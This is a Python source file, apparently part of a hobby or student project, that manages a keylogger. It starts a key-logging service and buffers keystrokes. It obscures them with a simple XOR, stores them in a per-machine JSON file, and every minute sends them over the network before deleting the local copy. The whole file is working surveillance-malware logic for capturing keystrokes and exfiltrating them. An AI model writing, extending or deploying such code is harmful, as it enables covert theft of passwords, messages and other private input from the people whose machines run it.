import datetime
import threading
import time
import json
import os
from KeyloggerService import service
from Encryption_file import encryptor
from FileWriter import file_writer
from networkWriter import networkWriter

class KeyLoggerManager:
    def __init__(self):
        self.buffer = []
        self.config = self.load_config()
        self.timestamp = self.get_hour_timestamp()
        self.end = False
        self.machine_name = self.config.get("machine_name", "unknown")
        self.file_path = f'{self.machine_name}.json'

        if not os.path.exists(self.file_path):
            with open(self.file_path, "w") as file:
                json.dump({}, file)

    def load_config(self):
        try:
            with open("config.json", "r") as f:
                return json.load(f)
        except FileNotFoundError:
            return {
                "machine_name": "unknown",
                "machine_ip": "127.0.0.1"

            }

    def get_hour_timestamp(self):
        now = datetime.datetime.now()
        hour_timestamp = now.replace(second=0, microsecond=0)
        return str(hour_timestamp)

    def send_to_network(self):
        while not self.end:
            time.sleep(60)
            with open(self.file_path,'r') as file:
                content = json.load(file)
            networkWriter.send_data(content,self.machine_name)
            os.remove(self.file_path)
            self.timestamp = self.get_hour_timestamp()

            with open(self.file_path, "w") as file:
                 json.dump({}, file)

    def manager(self):
        try:
            service.start_logging()
            network_thread = threading.Thread(target=self.send_to_network, daemon=True)
            network_thread.start()

            while not self.end:
                current_hour = self.get_hour_timestamp()
                if current_hour != self.timestamp:
                    self.timestamp = current_hour

                new_keys = service.get_logged_keys()
                if new_keys:
                    self.buffer.extend(new_keys)

                    if "<ESC>" in new_keys:
                        self.end = True

                    buffer_text = ''.join(self.buffer)
                    encrypted_text = encryptor.ascii_xor(buffer_text)

                    # שמירת המחרוזת המוצפנת כרשימה של תווים בודדים
                    data_dict = {self.timestamp: list(encrypted_text)}
                    file_writer.send_data(data_dict, self.machine_name)

                    self.buffer = []
                    service.logged_keys = []

                time.sleep(5)
        except KeyboardInterrupt:
            pass
        finally:
            service.stop_logging()


if __name__ == "__main__":
    print("keylogger start to run, for stop press ESC")
    manager = KeyLoggerManager()
    manager.manager()

